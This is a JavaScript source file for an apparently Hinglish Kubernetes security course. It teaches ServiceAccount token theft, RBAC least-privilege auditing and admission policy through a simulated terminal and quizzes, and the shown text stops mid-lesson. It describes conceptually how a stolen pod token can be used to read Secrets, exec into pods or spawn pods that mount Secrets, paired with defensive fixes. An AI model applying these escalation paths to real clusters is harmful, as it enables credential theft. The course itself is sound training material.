/* =====================================================================
   KubeGurukul — Track: 🛡️ Security Gurukul  (2026-11)
   "Attacker ek pod mein ghus gaya — ab woh kahan tak ja sakta hai, aur hum use kaise rokein?"

   Kahani wahi company: ChaiPay (pay-api, ledger, notify), namespace: payments.
   Chaar deewarein, isi kram mein:
     1. Pehchaan aur ijaazat   (ServiceAccount token + RBAC)      → sec-sa
     2. Darwaze par niyam      (admission policy)                 → sec-policy
     3. Saaman ki jaanch       (image scan, sign, digest)         → sec-supply
     4. Andar ka CCTV          (runtime detection + response)     → sec-runtime
   Scenes isi file mein hain (VISUALS[...] = …).
   ===================================================================== */
(function () {

const SA = 'system:serviceaccount:payments:notify-sa';

/* ------------------------------------------------------------------ */
/* LEVEL 1 — ServiceAccount tokens + RBAC audit                        */
/* ------------------------------------------------------------------ */
VISUALS['sec-sa'] = {
  t: 'ServiceAccount token — pod ki pehchaan, aur chor ke haath mein kya lagta hai',
  scene: {
    intro: '<b>Sawal:</b> attacker ko <code>notify</code> pod ke andar command chalane ka mauka mil gaya. Ab attacker cluster mein kya-kya kar sakta hai?',
    aria: 'ServiceAccount token ka safar: kubelet, pod, API Server, RBAC, aur chori hua token — 6 kadam',
    nodes: [
      { id: 'kubelet', col: 0, row: 0, icon: '🧑‍🔧', label: 'kubelet', sub: 'token mangwata hai', about: 'kubelet har pod ke liye API Server se ek chhoti umr wala token mangwata hai aur pod ke andar ek file mein rakh deta hai.' },
      { id: 'pod', col: 1, row: 0, icon: '📦', label: 'pod: notify', sub: 'SA: notify-sa', tone: 'good', about: 'Pod ki pehchaan uska ServiceAccount hai. Token file: <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.' },
      { id: 'api', col: 2, row: 0, icon: '🚪', label: 'API Server', sub: 'token → pehchaan', tone: 'accent', about: 'API Server token dekh kar pehchaanta hai: "yeh notify-sa hai". Phir RBAC se poochhta hai ki notify-sa ko yeh kaam karne ki ijaazat hai ya nahi.' },
      { id: 'rbac', col: 2, row: 1, icon: '🔐', label: 'RBAC', sub: 'Role + RoleBinding', tone: 'gold', about: 'RoleBinding notify-sa ko ek Role se jodti hai. Role mein likha hai: kaun se objects par kaun se kaam.' },
      { id: 'sec', col: 1, row: 1, icon: '🗝️', label: 'Secrets (payments)', sub: 'DB password, API keys', about: 'payments namespace ke Secrets: ledger ka database password, SMS provider ki key, bank gateway ki key.' },
      { id: 'bad', col: 0, row: 1, icon: '🦹', label: 'Attacker', sub: 'pod ke andar ghusa', tone: 'bad', about: 'Attacker ne notify ki ek library ki kamzori se pod ke andar command chalana seekh liya.' },
    ],
    steps: [
      { from: 'kubelet', to: 'pod', label: 'token file', say: '<b>kubelet</b> <b>pod: notify</b> ke andar ek token file rakhta hai. Token 1 ghante ka hota hai; kubelet use khud badalta rehta hai. Token sirf isi pod se bandha hai.' },
      { from: 'pod', to: 'api', label: 'request + token', say: '<b>pod: notify</b> jab bhi <b>API Server</b> se kuch maangta hai, token saath bhejta hai. API Server token se pehchaanta hai: yeh <code>notify-sa</code> hai.' },
      { from: 'api', to: 'rbac', label: 'ijaazat hai?', tone: 'gold', say: '<b>API Server</b> <b>RBAC</b> se poochhta hai: "notify-sa ko yeh kaam karne ki ijaazat hai?" Jawab RoleBinding aur Role se aata hai. Pehchaan token se, ijaazat RBAC se.' },
      { from: 'bad', to: 'pod', label: 'token chura liya', tone: 'bad', set: { pod: { tone: 'bad', sub: 'compromised' } }, say: '<b>Attacker</b> pod ke andar hai. Attacker token file padh leta hai. Ab attacker API Server ke liye <code>notify-sa</code> hi hai.' },
      { from: 'pod', to: 'api', label: 'list secrets', tone: 'bad', bend: 24, say: '<b>Attacker</b> notify ke token se <b>API Server</b> se payments namespace ke saare Secrets maangta hai. API Server ko farak nahi pata — token asli hai.' },
      { from: 'rbac', to: 'sec', label: 'allow ya deny?', tone: 'bad', say: 'Ab sab kuch <b>RBAC</b> par tika hai. Agar notify-sa ko "sab kuch" ki ijaazat hai, toh attacker ko <b>Secrets (payments)</b> mil gaye. Agar notify-sa ko sirf ek ConfigMap padhne ki ijaazat hai, toh attacker ke haath kuch nahi lagta. Yahi <b>least privilege</b> hai.' },
    ],
  },
};

const T_SA = [
  { text: 'Pata karo <code>notify</code> pod kaun sa ServiceAccount use karta hai (<code>kubectl describe pod</code>)', check: s => s.history.some(h => /^kubectl describe (pods?|po)[ \/]notify\b/.test(h)) },
  { text: 'Dekho us ServiceAccount ko kya-kya karne ki ijaazat hai (<code>kubectl auth can-i --list --as=…</code>)', check: s => !!s.cluster.sawList },
  { text: 'Dhoondho kaun si RoleBinding itni taaqat de rahi hai', check: s => s.history.some(h => /^kubectl (get|describe) (rolebindings?)\b/.test(h)) },
  { text: 'notify-sa ko sirf utni ijaazat do jitni notify ko chahiye', check: s => !!s.cluster.saFixed },
  { text: 'Pakka karo: <code>kubectl auth can-i get secrets --as=…</code> ka jawab ab <code>no</code> hai', check: s => !!s.cluster.verified },
];
const saList = fixed => fixed
  ? 'Resources                          Non-Resource URLs   Resource Names       Verbs\nselfsubjectreviews.authentication.k8s.io   []          []                   [create]\nconfigmaps                         []                  [notify-templates]   [get]\n(sirf ek cheez: notify-templates naam ka ConfigMap padhna. Attacker ke kaam ka kuch nahi.)'
  : 'Resources                          Non-Resource URLs   Resource Names   Verbs\n*.*                                []                  []               [*]\nselfsubjectreviews.authentication.k8s.io   []          []               [create]\n(*.* [*] = payments namespace ke HAR object par HAR kaam: Secrets padhna, pods mein exec, naye pods banana, sab kuch delete karna.)';

/* ------------------------------------------------------------------ */
/* LEVEL 2 — admission policy                                          */
/* ------------------------------------------------------------------ */
VISUALS['sec-policy'] = {
  t: 'Admission policy — darwaze par khada pehredaar',
  scene: {
    intro: '<b>Sawal:</b> RBAC kehta hai "developer Deployment bana sakta hai". Par kya developer <code>image: …:latest</code> wala ya root wala Deployment bhi bana sakta hai? Kaun rokega?',
    aria: 'admission policy ka raasta: kubectl, RBAC, mutate, validate, etcd ya inkaar — 6 kadam',
    nodes: [
      { id: 'dev', col: 0, row: 0, icon: '🧑‍💻', label: 'Developer', sub: 'kubectl apply', about: 'Developer ke paas Deployment banane ki RBAC ijaazat hai.' },
      { id: 'api', col: 1, row: 0, icon: '🚪', label: 'API Server', sub: 'kaun? ijaazat?', tone: 'accent', about: 'Pehle do sawal: tum kaun ho (authentication), tumhe ijaazat hai (RBAC)?' },
      { id: 'mut', col: 2, row: 0, icon: '✏️', label: 'Mutate', sub: 'chhoota hua bhar do', about: 'Mutating policy request ko <b>badal</b> sakti hai: jaise chhooti hui default settings jod dena.' },
      { id: 'val', col: 2, row: 1, icon: '🛂', label: 'Validate', sub: 'niyam: haan ya na', tone: 'gold', about: 'Validating policy request ko sirf <b>dekhti</b> hai aur haan ya na kehti hai. Kyverno ki ClusterPolicy ya Kubernetes ki apni ValidatingAdmissionPolicy.' },
      { id: 'etcd', col: 1, row: 1, icon: '📔', label: 'etcd', sub: 'object likha gaya', tone: 'good', about: 'Yahan pahunchne ke baad hi object "bana" maana jaata hai.' },
      { id: 'no', col: 0, row: 1, icon: '⛔', label: 'Inkaar', sub: 'error + wajah', tone: 'bad', about: 'Request etcd tak pahunchi hi nahi. Developer ko error milta hai jisme policy ka naam aur wajah likhi hoti hai.' },
    ],
    steps: [
      { from: 'dev', to: 'api', label: 'Deployment (image: latest)', say: '<b>Developer</b> ek Deployment bhejta hai jisme <code>image: chaipay/pay-api:latest</code> likha hai. <b>API Server</b> pehchaan aur RBAC jaanchta hai — dono theek.' },
      { from: 'api', to: 'mut', label: 'pehle mutate', say: 'RBAC ke baad request <b>Mutate</b> padav par jaati hai. Yahan policy chhooti hui cheezein jod sakti hai, jaise <code>seccompProfile: RuntimeDefault</code>.' },
      { from: 'mut', to: 'val', label: 'phir validate', tone: 'gold', say: 'Badli hui request <b>Validate</b> padav par jaati hai. Kram hamesha yahi hai: pehle mutate, phir validate — taaki niyam aakhri roop par lage.' },
      { from: 'val', to: 'no', label: 'latest tag mana hai', tone: 'bad', bend: -30, say: 'Policy <code>disallow-latest-tag</code> ka niyam: image ka tag <code>latest</code> nahi ho sakta. <b>Validate</b> "na" kehta hai. Developer ko <b>Inkaar</b> milta hai — error mein policy ka naam likha hai.' },
      { from: 'dev', to: 'api', label: 'image: 4.0.1', tone: 'good', bend: 24, say: '<b>Developer</b> tag ko <code>4.0.1</code> karke dobara bhejta hai. Request phir usi raaste se jaati hai: RBAC → Mutate → Validate.' },
      { from: 'val', to: 'etcd', label: 'pass', tone: 'good', say: 'Is baar <b>Validate</b> "haan" kehta hai. Deployment <b>etcd</b> mein likha jaata hai. Dhyaan do: RBAC batata hai <i>kaun</i> kya bana sakta hai; policy batati hai ki bana hua object <i>kaisa</i> hona chahiye.' },
    ],
  },
};

const T_POLICY = [
  { text: 'Naya version deploy karne ki koshish karo (<code>kubectl apply -f pay-api-v4.yaml</code>) aur error padho', check: s => !!s.cluster.sawBlock },
  { text: 'Cluster ki policies dekho — kaun si <b>Enforce</b> mein hai, kaun si <b>Audit</b> mein?', check: s => s.history.some(h => /^kubectl get (clusterpolic(y|ies)|cpol)\b/.test(h)) },
  { text: 'Deploy ko sahi tareeke se theek karo (policy ko chhede bina)', check: s => !!s.cluster.deployed },
  { text: 'Audit wali policy ki report padho: kitne workloads niyam tod rahe hain?', check: s => s.history.some(h => /^kubectl describe (policyreports?|polr)\b/.test(h)) },
  { text: 'Niyam todne wale workloads ko theek karo', check: s => !!s.cluster.violFixed },
  { text: 'Ab <code>require-requests</code> policy ko Enforce mein daalo', check: s => !!s.cluster.enforced },
];
const polReport = c => c.violFixed
  ? 'Name:         cpol-require-requests\nNamespace:    payments\nSummary:\n  Pass:   5\n  Fail:   0\nResults:\n  (koi fail nahi — paanchon workloads mein CPU aur memory request hai)'
  : 'Name:         cpol-require-requests\nNamespace:    payments\nSummary:\n  Pass:   2\n  Fail:   3\nResults:\n  Policy:   require-requests\n  Result:   fail\n  Message:  validation error: CPU and memory requests are required. rule check-requests failed\n  Resources:\n    Deployment/notify\n    Deployment/fraud-check\n    CronJob/nightly-report\n(Audit mode: yeh teeno workloads chal rahe hain, policy ne sirf likh kar rakha hai. Enforce karte hi in teeno ka AGLA deploy block hoga.)';

KG.registerLevels('secure', [
  /* ================================================================== */
  {
    id: 'sec-sa',
    icon: '🪪',
    title: 'ServiceAccount tokens — pod ki pehchaan aur least privilege',
    badge: 'Token Thanedaar',
    objectives: [
      'Har pod ke andar ek <b>token</b> hota hai — aur token chori ho sakta hai',
      'Pehchaan token se aati hai, <b>ijaazat RBAC</b> se',
      '<code>kubectl auth can-i --list --as=…</code> se dekhna ki ek ServiceAccount kya-kya kar sakta hai',
      'Zaroorat se zyada taaqat wale ServiceAccount ko theek karna (terminal)',
    ],
    lesson: [
      `<h3>🏨 Misaal: hotel ka key-card</h3>
       <p>Hotel mein har staff ke paas ek key-card hota hai. Safai wale ka card sirf kamron ke darwaze kholta hai.
       Manager ka card tijori bhi kholta hai.</p>
       <p>Ab socho: safai wale ka card <b>chori</b> ho gaya. Chor kya khol payega? <b>Wahi jo us card ko allowed tha.</b></p>
       <p>Kubernetes mein:</p>
       <ul>
         <li><b>ServiceAccount</b> = staff ki pehchaan (app ke liye, insaan ke liye nahi).</li>
         <li><b>Token</b> = key-card. Har pod ke andar ek file mein rakha hota hai.</li>
         <li><b>RBAC</b> (Role + RoleBinding) = card kaun-kaun se darwaze kholta hai.</li>
       </ul>
       <p><b>Asli baat:</b> app mein kamzori nikalna aam hai. Sawal yeh nahi ki "attacker pod mein ghusega ya nahi".
       Sawal yeh hai: "ghusne ke baad us pod ka card kya-kya kholta hai?"</p>`,
      `<h3>🎫 Token: kahan hai, kitna chalta hai</h3>
       <pre># pod ke andar
/var/run/secrets/kubernetes.io/serviceaccount/token</pre>
       <ul>
         <li>Token <b>1 ghante</b> ka hota hai. kubelet use khud badalta rehta hai.</li>
         <li>Token usi pod se <b>bandha</b> hai. Pod delete → token bekaar.</li>
         <li>Pod mein <code>serviceAccountName</code> na likho toh pod ko namespace ka <code>default</code> ServiceAccount milta hai.</li>
       </ul>
       <p><b>Do aasaan bachav:</b></p>
       <pre># 1. App Kubernetes API se baat hi nahi karti? Token mat do.
automountServiceAccountToken: false

# 2. Har app ka apna ServiceAccount — "default" ko kabhi ijaazat mat do.
serviceAccountName: notify-sa</pre>
       <p><code>default</code> ServiceAccount ko ijaazat dene ka matlab: us namespace ke <b>har</b> pod ko wahi ijaazat mil gayi.</p>`,
      `<h3>🔎 Audit ka ek command, aur khatarnak ijaazatein</h3>
       <pre>kubectl auth can-i --list \\
  --as=system:serviceaccount:payments:notify-sa -n payments

kubectl auth can-i get secrets \\
  --as=system:serviceaccount:payments:notify-sa -n payments</pre>
       <p><code>--as=</code> ka matlab: "mujhe woh dikhao jo is ServiceAccount ko dikhta". Naam ka roop: <code>system:serviceaccount:NAMESPACE:NAAM</code>.</p>
       <table>
         <tr><th>Ijaazat</th><th>Attacker ke liye iska matlab</th></tr>
         <tr><td><code>secrets</code>: get / list</td><td>Saare passwords aur keys</td></tr>
         <tr><td><code>pods/exec</code>: create</td><td>Kisi bhi pod ke andar command</td></tr>
         <tr><td><code>pods</code>: create</td><td>Naya pod banakar koi bhi Secret ya ServiceAccount mount kar lena</td></tr>
         <tr><td><code>*</code> on <code>*</code></td><td>Upar ka sab kuch, ek saath</td></tr>
       </table>
       <p><b>Least privilege:</b> app ko sirf utni ijaazat jitni app ko kaam ke liye chahiye. Naam tak likh sakte ho
       (<code>resourceNames: ["notify-templates"]</code>).</p>`,
    ],
    stages: [
      {
        type: 'bins',
        title: 'Khatarnak ya theek?',
        instructions: 'Har ijaazat ek app ke ServiceAccount ko di gayi hai. Socho: yeh token chori ho jaye toh attacker is ijaazat se kya kar lega?',
        bins: [
          { id: 'bad', label: '🚨 Khatarnak — attacker aage badh sakta hai' },
          { id: 'ok', label: '✅ Theek — nuksaan seemit' },
        ],
        items: [
          { text: 'list secrets (poore namespace mein)', bin: 'bad', explain: 'list Secrets ka poora maal lautata hai, sirf naam nahi. Attacker ko namespace ke saare passwords mil gaye.' },
          { text: 'get configmap, sirf "notify-templates" naam ka', bin: 'ok', explain: 'Ek hi object, sirf padhna. ConfigMap mein raaz nahi hone chahiye. Yahi least privilege dikhta hai.' },
          { text: 'create pods/exec', bin: 'bad', explain: 'Attacker kisi bhi pod (jaise ledger-0) ke andar command chala sakta hai aur us pod ka token bhi chura sakta hai.' },
          { text: 'create pods', bin: 'bad', explain: 'Attacker ek naya pod banakar usme koi bhi Secret mount kar sakta hai, ya zyada taaqat wala ServiceAccount laga sakta hai.' },
          { text: 'get, list endpoints (apne namespace mein)', bin: 'ok', explain: 'Endpoints mein sirf pods ke IP hote hain. Service discovery ke liye aam ijaazat; isse aage badhna mushkil hai.' },
          { text: 'ClusterRoleBinding → cluster-admin', bin: 'bad', explain: 'Poora cluster: har namespace, har Secret, nodes bhi. Ek app ke liye yeh kabhi sahi nahi.' },
        ],
      },
      {
        type: 'terminal',
        title: '🖥️ Mission: notify ka card kya-kya kholta hai?',
        instructions: 'Security review mein sawal aaya: "Agar notify pod compromise ho jaye toh attacker kya kar sakta hai?" Jawab andaaze se nahi, command se do.',
        goal: `<b>notify</b> pod ke ServiceAccount ki ijaazat jaancho aur use <b>least privilege</b> par lao.
          notify ko Kubernetes API se sirf ek kaam chahiye: ConfigMap <code>notify-templates</code> padhna.<br>
          ServiceAccount ka poora naam: <code>${SA}</code>`,
        tasks: T_SA,
        cluster: {
          nodes: [{ name: 'node-1', status: 'Ready', roles: '<none>', age: '40d', version: 'v1.33.4' }],
          pods: [
            { name: 'notify-5c9d4f-k3', ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.21',
              logs: 'notify starting...\nloaded 14 templates from configmap "notify-templates" via Kubernetes API\nconnected to SQS queue\n(notify Kubernetes API se sirf ek kaam karta hai: ConfigMap notify-templates padhna)',
              describe: 'Name:             notify-5c9d4f-k3\nNamespace:        payments\nService Account:  notify-sa        <-- pod ki pehchaan\nStatus:           Running\nContainers:\n  notify:\n    Image:  chaipay/notify:2.3.0\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-x7k2p (ro)   <-- token yahan hai' },
            { name: 'ledger-0', ready: '1/1', status: 'Running', restarts: 0, age: '9d', node: 'node-1', ip: '10.244.1.30' },
          ],
          secrets: [
            { name: 'ledger-db-password', type: 'Opaque', dataCount: 1, age: '40d' },
            { name: 'bank-gateway-key', type: 'Opaque', dataCount: 2, age: '40d' },
            { name: 'sms-provider-key', type: 'Opaque', dataCount: 1, age: '40d' },
          ],
          custom: {
            sa: { names: ['sa', 'serviceaccount', 'serviceaccounts'], cols: ['NAME', 'SECRETS', 'AGE'],
              items: [{ name: 'default', row: ['0', '40d'] }, { name: 'notify-sa', row: ['0', '40d'], describe: 'Name:                notify-sa\nNamespace:           payments\nImage pull secrets:  <none>\nMountable secrets:   <none>\nTokens:              <none>\n(yahan ijaazat nahi dikhti. Ijaazat RoleBinding mein hoti hai: kubectl get rolebindings)' }] },
            rolebinding: { names: ['rolebinding', 'rolebindings'], cols: ['NAME', 'ROLE', 'AGE'],
              items: [{ name: 'notify-ops', row: ['Role/ops-all', '38d'],
                describe: 'Name:         notify-ops\nRole:\n  Kind:  Role\n  Name:  ops-all\nSubjects:\n  Kind            Name       Namespace\n  ----            ----       ---------\n  ServiceAccount  notify-sa  payments\n(38 din pehle kisi ne "jaldi mein" notify-sa ko ops-all Role de diya. Role dekho: kubectl describe role ops-all)' }] },
            role: { names: ['role', 'roles'], cols: ['NAME', 'CREATED AT'],
              items: [{ name: 'ops-all', row: ['2026-10-06T05:50:44Z'],
                describe: 'Name:         ops-all\nPolicyRule:\n  Resources  Non-Resource URLs  Resource Names  Verbs\n  ---------  -----------------  --------------  -----\n  *.*        []                 []              [*]\n(har object, har kaam — namespace payments ke andar)' }] },
          },
        },
        responses: [
          { re: /^kubectl auth can-i --list\b(?=.*--as[= ]system:serviceaccount:payments:notify-sa)/, mutate: s => { s.cluster.sawList = true; }, out: s => saList(s.cluster.saFixed) },
          { re: /^kubectl auth can-i (get|list|watch) secrets?\b(?=.*--as[= ]system:serviceaccount:payments:notify-sa)/, mutate: s => { if (s.cluster.saFixed) s.cluster.verified = true; },
            out: s => s.cluster.saFixed ? 'no' : 'yes\n(notify ka token chori ho toh attacker payments ke teeno Secrets padh sakta hai)' },
          { re: /^kubectl auth can-i get (configmaps?|cm)[ \/]notify-templates\b(?=.*--as[= ]system:serviceaccount:payments:notify-sa)/, out: 'yes' },
          { re: /^kubectl auth can-i\b(?=.*--as[= ]system:serviceaccount:payments:notify-sa)/, out: s => s.cluster.saFixed ? 'no' : 'yes' },
          { re: /^kubectl auth can-i\b/, err: true, out: 'Yeh jawab TUMHARI ijaazat ka hoga (tum admin ho → hamesha yes). ServiceAccount ki ijaazat dekhne ke liye --as jodo:\n  kubectl auth can-i --list --as=' + SA },
        ],
        files: {
          'fix-notify-least-privilege.yaml': {
            desc: 'Purani RoleBinding hatata hai; naya Role sirf ConfigMap notify-templates padhne deta hai',
            content: 'apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: notify-templates-reader\n  namespace: payments\nrules:\n  - apiGroups: [""]\n    resources: ["configmaps"]\n    resourceNames: ["notify-templates"]   # sirf yahi ek ConfigMap\n    verbs: ["get"]\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: notify-templates-reader\n  namespace: payments\nsubjects:\n  - kind: ServiceAccount\n    name: notify-sa\n    namespace: payments\nroleRef:\n  kind: Role\n  name: notify-templates-reader\n  apiGroup: rbac.authorization.k8s.io\n# (purani RoleBinding notify-ops isi badlaav mein hatayi gayi hai)',
            apply: s => {
              const c = s.cluster;
              c.saFixed = true;
              c.custom.rolebinding.items = [{ name: 'notify-templates-reader', row: ['Role/notify-templates-reader', '5s'],
                describe: 'Name:         notify-templates-reader\nRole:\n  Kind:  Role\n  Name:  notify-templates-reader\nSubjects:\n  Kind            Name       Namespace\n  ----            ----       ---------\n  ServiceAccount  notify-sa  payments' }];
              c.custom.role.items.push({ name: 'notify-templates-reader', row: ['2026-11-14T06:10:02Z'],
                describe: 'Name:         notify-templates-reader\nPolicyRule:\n  Resources   Non-Resource URLs  Resource Names      Verbs\n  ---------   -----------------  --------------      -----\n  configmaps  []                 [notify-templates]  [get]' });
              return 'role.rbac.authorization.k8s.io/notify-templates-reader created\nrolebinding.rbac.authorization.k8s.io/notify-templates-reader created\nrolebinding.rbac.authorization.k8s.io "notify-ops" deleted\n(notify chal raha hai: templates abhi bhi load ho rahe hain. Ab can-i se pakka karo.)';
            },
          },
          'fix-no-token.yaml': {
            desc: 'notify pod mein automountServiceAccountToken: false lagata hai',
            apply: () => '(simulator ne roka) Token hatane se attacker ke haath kuch nahi lagega — par notify ko ConfigMap notify-templates padhne ke liye Kubernetes API chahiye (kubectl logs notify dekho). Token hataoge toh notify start hi nahi hoga. Yeh fix un apps ke liye hai jo API se baat nahi karti.',
          },
          'fix-use-default-sa.yaml': {
            desc: 'notify ko default ServiceAccount par le jaata hai aur default ko ops-all deta hai',
            apply: () => '(simulator ne roka) default ServiceAccount ko ijaazat dene se payments namespace ke HAR pod ko wahi ijaazat mil jaati hai (ledger, pay-api, sab). Problem badi ho jaati hai, chhoti nahi.',
          },
        },
        success: KG.allOf(T_SA),
        successText: `Pehle: notify ka token chori hota toh attacker ke paas payments namespace ka <b>sab kuch</b> tha (<code>*.* [*]</code>) — teeno Secrets, har pod mein exec.
          Ab: wahi token sirf ek ConfigMap padh sakta hai. notify ka kaam waise hi chal raha hai.
          <b>Yaad rakho:</b> ijaazat ServiceAccount mein nahi dikhti — RoleBinding mein hoti hai. Aur andaaza mat lagao: <code>kubectl auth can-i --list --as=…</code> seedha sach bata deta hai.`,
        hints: [
          'kubectl describe pod notify-5c9d4f-k3 mein "Service Account" dekho. Phir: kubectl auth can-i --list --as=' + SA,
          'kubectl get rolebindings aur kubectl describe rolebinding notify-ops. Role ops-all mein *.* [*] hai.',
          'kubectl apply -f fix-notify-least-privilege.yaml, phir kubectl auth can-i get secrets --as=' + SA,
        ],
        solution: [
          'kubectl describe pod notify-5c9d4f-k3',
          'kubectl auth can-i --list --as=' + SA,
          'kubectl get rolebindings',
          'kubectl describe rolebinding notify-ops',
          'kubectl apply -f fix-notify-least-privilege.yaml',
          'kubectl auth can-i get secrets --as=' + SA,
        ],
      },
      {
        type: 'quiz',
        title: 'Pakka karo — token ke niyam',
        questions: [
          {
            q: 'pay-api Kubernetes API se kabhi baat nahi karti. pay-api ke pod ke liye sabse achha kya hai?',
            choices: [
              'pay-api ko default ServiceAccount dena, kyunki default ke paas koi ijaazat nahi hoti',
              'automountServiceAccountToken: false — pod ke andar token rakha hi na jaye',
              'pay-api ke ServiceAccount ko view ClusterRole dena taaki sirf padh sake',
              'Token ki umr 1 ghante se ghata kar 10 minute karna',
            ],
            answer: 1,
            explain: 'Jo cheez hai hi nahi, woh chori nahi ho sakti. App API se baat nahi karti toh token ka koi kaam nahi — use mount hi mat karo. (default ServiceAccount par bharosa mat karo: koi bhi use baad mein ijaazat de sakta hai.)',
          },
          {
            q: 'Ek pod ke YAML mein serviceAccountName nahi likha. Us pod ko kaun si pehchaan milegi?',
            choices: [
              'Koi pehchaan nahi — pod API Server se baat nahi kar payega',
              'Us node ke kubelet ki pehchaan, jis par pod chal raha hai',
              'Namespace ka default ServiceAccount, token ke saath',
              'Us insaan ki pehchaan jisne kubectl apply chalaya tha',
            ],
            answer: 2,
            explain: 'Har namespace mein ek default ServiceAccount hota hai, aur naam na likhne par pod ko wahi milta hai. Isi liye default ko kabhi koi ijaazat mat do: woh us namespace ke har "bina naam wale" pod ko mil jaati hai.',
          },
        ],
      },
    ],
    interview: {
      title: 'Interview Round — pehchaan aur ijaazat',
      instructions: 'Security round ka pehla sawal aksar yahi hota hai. 🎤',
      questions: [
        {
          q: '"Ek pod compromise ho gaya. Attacker cluster mein kitna aage ja sakta hai — yeh kis par nirbhar karta hai?"',
          choices: [
            'Sirf is par ki pod ki image kitni purani hai; purani image mein zyada tools hote hain',
            'Us pod ke ServiceAccount ki RBAC ijaazat par, aur is par ki pod network mein kahan-kahan pahunch sakta hai',
            'Is par ki cluster mein kitne nodes hain; zyada nodes mein attacker ko dhoondhna mushkil hota hai',
            'Kisi par nahi — pod ke andar ka attacker hamesha pod ke andar hi rehta hai',
          ],
          answer: 1,
          explain: 'Pod ke andar se do raaste khulte hain: (1) token ke zariye Kubernetes API — RBAC tay karta hai. (2) network ke zariye doosre pods/databases — NetworkPolicy tay karti hai. Dono ko seemit rakhna hi "blast radius" chhota rakhna hai.',
        },
        {
          q: '"Kaise pata karoge ki koi ServiceAccount zaroorat se zyada taaqatwar hai?"',
          choices: [
            'kubectl describe serviceaccount — ijaazatein wahin likhi hoti hain',
            'kubectl get pods -o wide — taaqatwar ServiceAccount wale pods alag node par chalte hain',
            'kubectl auth can-i --list --as=system:serviceaccount:NS:NAAM, aur RoleBindings mein * dhoondhkar',
            'kubectl logs — pod apni ijaazatein start hote waqt log mein likh deta hai',
          ],
          answer: 2,
          explain: 'ServiceAccount object mein ijaazat nahi hoti. Ijaazat RoleBinding/ClusterRoleBinding se aati hai. can-i --list us ServiceAccount ki nazar se poora jawab deta hai. Dhoondhne layak cheezein: *, secrets, pods/exec, create pods, cluster-admin.',
        },
        {
          q: '"list secrets aur get secret (ek naam ka) mein security ke lihaaz se kya farak hai?"',
          choices: [
            'Koi farak nahi — dono sirf Secret ka naam dikhate hain, maal nahi',
            'list zyada surakshit hai kyunki list ke jawab mein data base64 mein hota hai',
            'get ek Secret tak seemit ho sakta hai; list saare Secrets ka poora maal deta hai',
            'get ke liye token chahiye, list bina token ke bhi chalta hai',
          ],
          answer: 2,
          explain: 'list ka jawab har Secret ka poora data hota hai. Isliye "sirf list" bhi sab kuch dena hai. Zaroorat ek Secret ki ho toh get + resourceNames se usi ek naam tak seemit karo.',
        },
      ],
    },
    success: [
      'Main bata sakta hoon ki pod ka token kahan hota hai aur chori hone par kya hota hai',
      'Main <code>kubectl auth can-i --list --as=…</code> se kisi ServiceAccount ki ijaazat nikaal sakta hoon',
      'Main ek ServiceAccount ko least privilege par la sakta hoon',
    ],
    homework: `<p>Asli cluster par: <b>🧪 Real Lab 18 — ServiceAccount audit</b> (Home → Real Cluster Labs).</p>
      <pre>kubectl get rolebindings,clusterrolebindings -A -o wide | grep -i serviceaccount
kubectl auth can-i --list --as=system:serviceaccount:&lt;ns&gt;:&lt;sa&gt; -n &lt;ns&gt;</pre>`,
    cards: [
      { front: 'Pod ke andar ServiceAccount ka token kahan hota hai, aur kitna chalta hai?', back: '<code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. 1 ghante ka, kubelet badalta rehta hai, pod se bandha.' },
      { front: 'Ek ServiceAccount ki saari ijaazat dekhne ka command?', back: '<code>kubectl auth can-i --list --as=system:serviceaccount:NS:NAAM -n NS</code>' },
      { front: 'App Kubernetes API se baat nahi karti. Sabse achha bachav?', back: '<code>automountServiceAccountToken: false</code> — token pod mein rakha hi nahi jaata.' },
      { front: 'Chaar khatarnak ijaazatein?', back: '<code>secrets</code> get/list · <code>pods/exec</code> create · <code>pods</code> create · <code>*</code> on <code>*</code> (ya cluster-admin).' },
      { front: 'default ServiceAccount ko ijaazat kyun nahi dete?', back: 'Jis pod mein serviceAccountName nahi likha, use default milta hai. Ijaazat namespace ke har aise pod ko mil jaati hai.' },
    ],
  },

  /* ================================================================== */
  {
    id: 'sec-policy',
    icon: '🛂',
    title: 'Admission Policy — galat cheez ko cluster mein ghusne se pehle rokna',
    badge: 'Policy Pehredaar',
    objectives: [
      'RBAC = <b>kaun</b> bana sakta hai. Policy = jo ban raha hai woh <b>kaisa</b> ho',
      'Teen kaam: <b>validate</b> (roko), <b>mutate</b> (theek kar do), <b>generate</b> (saath mein bana do)',
      '<b>Audit</b> pehle, <b>Enforce</b> baad mein — aur beech mein report padhna',
      'Block hue deploy ko sahi tareeke se kholna + policy ko surakshit tareeke se Enforce karna (terminal)',
    ],
    lesson: [
      `<h3>🏗️ Misaal: building ka naksha paas karna</h3>
       <p>Tumhare paas zameen hai, toh tum building bana sakte ho (<b>ijaazat</b>). Par nagar nigam naksha dekhta hai:
       aag se bachne ka raasta hai? Unchai seema mein hai? (<b>niyam</b>)</p>
       <p>Kubernetes mein:</p>
       <ul>
         <li><b>RBAC</b>: "developer payments namespace mein Deployment bana sakta hai."</li>
         <li><b>Admission policy</b>: "par us Deployment mein <code>latest</code> tag nahi hoga, root nahi chalega, requests likhi hongi."</li>
       </ul>
       <p>Policy <b>API Server ke darwaze par</b> lagti hai — object ke etcd mein likhe jaane se <b>pehle</b>.
       Galat cheez cluster mein aati hi nahi.</p>
       <p><b>Asli baat:</b> "sab log dhyaan rakhenge" koi suraksha nahi hai. Niyam ko machine se lagu karwao.</p>`,
      `<h3>🧰 Teen kaam, do auzaar</h3>
       <table>
         <tr><th>Kaam</th><th>Kya karta hai</th><th>Misaal</th></tr>
         <tr><td><b>Validate</b></td><td>Haan ya na</td><td><code>latest</code> tag wali image ko mana karo</td></tr>
         <tr><td><b>Mutate</b></td><td>Request ko badal do</td><td>Chhooti hui <code>seccompProfile</code> jod do</td></tr>
         <tr><td><b>Generate</b></td><td>Saath mein naya object bana do</td><td>Naye namespace mein default-deny NetworkPolicy</td></tr>
       </table>
       <p><b>Auzaar 1 — Kyverno:</b> policy bhi ek Kubernetes YAML hai (<code>ClusterPolicy</code>). Teeno kaam karta hai.</p>
